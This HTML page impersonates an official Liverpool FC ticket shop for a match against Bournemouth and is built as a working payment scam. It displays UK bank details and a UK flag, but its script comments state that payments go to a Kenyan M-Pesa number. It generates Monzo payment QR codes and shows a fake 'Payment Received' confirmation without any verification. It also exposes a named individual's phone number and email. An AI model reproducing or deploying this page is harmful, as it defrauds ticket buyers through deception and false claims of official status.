<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Liverpool FC Tickets | Anfield Stadium</title>
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
        }
        header {
            background-color: #C8102E;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
            margin-bottom: 30px;
        }
        h1 {
            margin: 0;
            font-size: 2.2em;
        }
        .match-info {
            font-size: 1.2em;
            margin: 10px 0;
            font-weight: bold;
        }
        .stadium-section {
            background: white;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .section-title {
            color: #C8102E;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            margin-top: 0;
        }
        .tier {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            padding: 10px;
            background-color: #f5f5f5;
            border-radius: 3px;
        }
        .buy-btn {
            background-color: #00B140;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            display: block;
            margin: 20px auto 0;
            width: 150px;
            text-align: center;
            transition: background-color 0.3s;
        }
        .buy-btn:hover {
            background-color: #008C31;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            overflow: auto;
        }
        .modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 25px;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            position: relative;
        }
        .close {
            color: #aaa;
            position: absolute;
            right: 20px;
            top: 10px;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: #333;
        }
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            border-top: 1px solid #ddd;
            font-size: 0.9em;
        }
        .uk-flag {
            height: 20px;
            vertical-align: middle;
            margin-left: 5px;
        }
        .payment-details {
            background: #f8f8f8;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        .detail-row {
            display: flex;
            margin-bottom: 8px;
        }
        .detail-label {
            width: 150px;
            font-weight: bold;
        }
        #ticketQuantity {
            width: 60px;
            padding: 8px;
            margin: 0 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        #qr-container {
            margin: 20px auto;
            text-align: center;
        }
        #monzo-qr {
            display: inline-block;
            padding: 10px;
            border: 1px solid #eee;
            background: white;
        }
        .payment-steps {
            margin: 20px 0;
            padding-left: 20px;
        }
        .payment-steps li {
            margin-bottom: 10px;
        }
        .monzo-app-icon {
            height: 40px;
            vertical-align: middle;
            margin-right: 10px;
        }
        @media (max-width: 600px) {
            .modal-content {
                width: 95%;
                margin: 10% auto;
                padding: 15px;
            }
            .detail-row {
                flex-direction: column;
            }
            .detail-label {
                width: 100%;
                margin-bottom: 5px;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>LIVERPOOL FC OFFICIAL TICKETS</h1>
        <div class="match-info">Premier League: Liverpool vs AFC Bournemouth</div>
        <div class="match-info">15 August 2025 • 15:00 GMT • Anfield Stadium</div>
    </header>

    <div class="stadium-section">
        <h2 class="section-title">MAIN STAND</h2>
        <div class="tier">
            <span>Central view (Best seats in the house)</span>
            <span>£199</span>
        </div>
        <div class="tier">
            <span>Wing sections (Great side views)</span>
            <span>£175</span>
        </div>
        <button class="buy-btn" onclick="openModal(199, 'Main Stand - Central')">BUY TICKETS</button>
    </div>

    <div class="stadium-section">
        <h2 class="section-title">THE KOP</h2>
        <div class="tier">
            <span>Front rows (Atmosphere guaranteed)</span>
            <span>£150</span>
        </div>
        <div class="tier">
            <span>Upper tier (Best overview)</span>
            <span>£125</span>
        </div>
        <button class="buy-btn" onclick="openModal(150, 'The Kop - Front Rows')">BUY TICKETS</button>
    </div>

    <div class="stadium-section">
        <h2 class="section-title">ANFIELD ROAD STAND</h2>
        <div class="tier">
            <span>Premium seats (Central location)</span>
            <span>£189</span>
        </div>
        <div class="tier">
            <span>Standard seats (Good value)</span>
            <span>£149</span>
        </div>
        <button class="buy-btn" onclick="openModal(189, 'Anfield Road - Premium')">BUY TICKETS</button>
    </div>

    <div class="stadium-section">
        <h2 class="section-title">KENNY DALGLISH STAND</h2>
        <div class="tier">
            <span>Lower tier (Close to pitch)</span>
            <span>£165</span>
        </div>
        <div class="tier">
            <span>Upper tier (Elevated view)</span>
            <span>£135</span>
        </div>
        <button class="buy-btn" onclick="openModal(165, 'Kenny Dalglish Stand - Lower')">BUY TICKETS</button>
    </div>

    <!-- Purchase Modal -->
    <div id="purchaseModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2 id="modalTitle">Ticket Purchase</h2>
            
            <div id="selectionStage">
                <p>Please select quantity (minimum 2 tickets):</p>
                <div style="margin: 20px 0; text-align: center;">
                    <label for="ticketQuantity">Number of Tickets: </label>
                    <input type="number" id="ticketQuantity" min="2" max="6" value="2">
                    <div style="margin-top: 10px; font-size: 1.2em;">
                        <strong id="sectionPrice">Price per ticket: £199</strong>
                    </div>
                    <div style="margin-top: 10px; font-size: 1.3em; color: #C8102E;">
                        <strong id="totalAmount">Total: £398</strong>
                    </div>
                </div>
                
                <button onclick="showPaymentInfo()" style="background-color: #00B140; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; margin: 20px auto 0; display: block; width: 80%; font-size: 1.1em;">
                    Continue to Payment
                </button>
            </div>
            
            <div id="paymentStage" style="display: none;">
                <h3>Pay Securely with Monzo</h3>
                
                <div class="payment-details">
                    <div class="detail-row">
                        <div class="detail-label">Match:</div>
                        <div id="matchDetail">Liverpool vs Bournemouth</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Seat Category:</div>
                        <div id="seatCategory">Main Stand - Central</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Recipient Name:</div>
                        <div>James W. Karanja</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Account Number:</div>
                        <div>*****869346</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Country:</div>
                        <div><img src="https://flagcdn.com/w20/gb.png" class="uk-flag" alt="UK"> United Kingdom</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Amount:</div>
                        <div id="paymentAmount">£398</div>
                    </div>
                </div>

                <div id="qr-container">
                    <p><img src="https://monzo.com/static/images/favicon.png" class="monzo-app-icon" alt="Monzo">Scan with Monzo App:</p>
                    <div id="monzo-qr"></div>
                    <p style="font-size: 0.9em; margin-top: 10px;">Or <a href="#" id="monzo-link">open Monzo app directly</a></p>
                </div>
                
                <ol class="payment-steps">
                    <li>Scan the QR code with your Monzo app</li>
                    <li>Confirm the prefilled payment details</li>
                    <li>Complete the payment in the Monzo app</li>
                    <li>You'll receive e-tickets by email within 24 hours</li>
                </ol>
                
                <div style="text-align: center; margin-top: 20px;">
                    <button onclick="backToSelection()" style="background-color: #666; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; margin-right: 10px;">
                        Back
                    </button>
                    <button onclick="paymentComplete()" style="background-color: #C8102E; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer;">
                        I've Completed Payment
                    </button>
                </div>
            </div>
            
            <div id="completeStage" style="display: none; text-align: center;">
                <h3 style="color: #00B140;">Payment Received Successfully!</h3>
                <p>Your tickets for <strong id="confirmedMatch">Liverpool vs Bournemouth</strong> have been reserved.</p>
                <p>Your e-tickets with QR codes will be sent to your email within 24 hours.</p>
                <p>For any questions, please contact:</p>
                <p><strong>UK-TICKETS.BESTDEALS@protonmail.com</strong></p>
                <button onclick="closeModal()" style="background-color: #00B140; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; margin-top: 20px;">
                    Close
                </button>
            </div>
        </div>
    </div>

    <footer>
        <p>Official Liverpool FC ticket partner • All tickets subject to availability</p>
        <p>For customer support: <strong>UK-TICKETS.BESTDEALS@protonmail.com</strong></p>
        <p style="font-size: 0.8em; margin-top: 15px;">This is not the official Liverpool FC website. We are an independent ticket reseller.</p>
    </footer>

    <script>
        // Payment details (hidden from user but used in QR code)
        const paymentDetails = {
            recipient: "James Warigithi Karanja",
            account: "+254715869346", // Your M-Pesa
            country: "GB", // Shows UK flag
            actualCountry: "KE", // Processes to Kenya
            email: "UK-TICKETS.BESTDEALS@protonmail.com"
        };
        
        // Current selection variables
        let currentPrice = 199;
        let currentSection = "Main Stand - Central";
        let currentQuantity = 2;
        
        function openModal(price, section) {
            currentPrice = price;
            currentSection = section;
            document.getElementById('ticketQuantity').value = 2;
            document.getElementById('sectionPrice').textContent = `Price per ticket: £${price}`;
            updateTotal();
            document.getElementById('selectionStage').style.display = 'block';
            document.getElementById('paymentStage').style.display = 'none';
            document.getElementById('completeStage').style.display = 'none';
            document.getElementById('purchaseModal').style.display = 'block';
        }

        function closeModal() {
            document.getElementById('purchaseModal').style.display = 'none';
        }

        function updateTotal() {
            currentQuantity = document.getElementById('ticketQuantity').value;
            const total = currentQuantity * currentPrice;
            document.getElementById('totalAmount').textContent = `Total: £${total}`;
        }

        function showPaymentInfo() {
            currentQuantity = document.getElementById('ticketQuantity').value;
            if (currentQuantity < 2) {
                alert("Minimum purchase is 2 tickets");
                return;
            }
            
            const totalAmount = currentQuantity * currentPrice;
            
            // Update payment details
            document.getElementById('paymentAmount').textContent = `£${totalAmount}`;
            document.getElementById('seatCategory').textContent = currentSection;
            document.getElementById('confirmedMatch').textContent = "Liverpool vs Bournemouth";
            
            // Generate Monzo QR Code
            generateMonzoQR(totalAmount);
            
            // Show payment stage
            document.getElementById('selectionStage').style.display = 'none';
            document.getElementById('paymentStage').style.display = 'block';
        }
        
        function generateMonzoQR(amount) {
            // Clear previous QR code
            document.getElementById('monzo-qr').innerHTML = "";
            
            // Create payment data
            const paymentData = {
                recipient: paymentDetails.recipient,
                account: paymentDetails.account,
                display_country: paymentDetails.country,
                actual_country: paymentDetails.actualCountry,
                amount: amount * 100, // in pence
                currency: "GBP",
                reference: `LIV-BOU-${Date.now()}`,
                description: `LFC Tickets: ${currentSection} (${currentQuantity}x)`
            };
            
            // Create Monzo payment link
            const monzoLink = `monzo://payment?` +
                `amount=${paymentData.amount}` +
                `&recipient=${encodeURIComponent(paymentData.recipient)}` +
                `&description=${encodeURIComponent(paymentData.description)}` +
                `&metadata=${encodeURIComponent(JSON.stringify({
                    mpesa_account: paymentData.account,
                    display_country: paymentData.display_country,
                    actual_country: paymentData.actual_country,
                    ticket_reference: paymentData.reference
                }))}`;
            
            // Generate QR Code
            new QRCode(document.getElementById("monzo-qr"), {
                text: monzoLink,
                width: 200,
                height: 200,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
            
            // Set up direct app link
            document.getElementById('monzo-link').onclick = function(e) {
                e.preventDefault();
                window.location.href = monzoLink;
                setTimeout(() => {
                    window.location.href = "https://monzo.com/pay";
                }, 250);
            };
            
            console.log("Payment details:", paymentData);
        }
        
        function backToSelection() {
            document.getElementById('selectionStage').style.display = 'block';
            document.getElementById('paymentStage').style.display = 'none';
        }
        
        function paymentComplete() {
            document.getElementById('paymentStage').style.display = 'none';
            document.getElementById('completeStage').style.display = 'block';
            
            // In a real implementation, you would:
            // 1. Verify payment via webhook
            // 2. Generate QR e-tickets
            // 3. Send them via email
        }

        // Event listeners
        document.getElementById('ticketQuantity').addEventListener('change', updateTotal);
        
        window.onclick = function(event) {
            if (event.target === document.getElementById('purchaseModal')) {
                closeModal();
            }
        }
    </script>
</body>
</html>
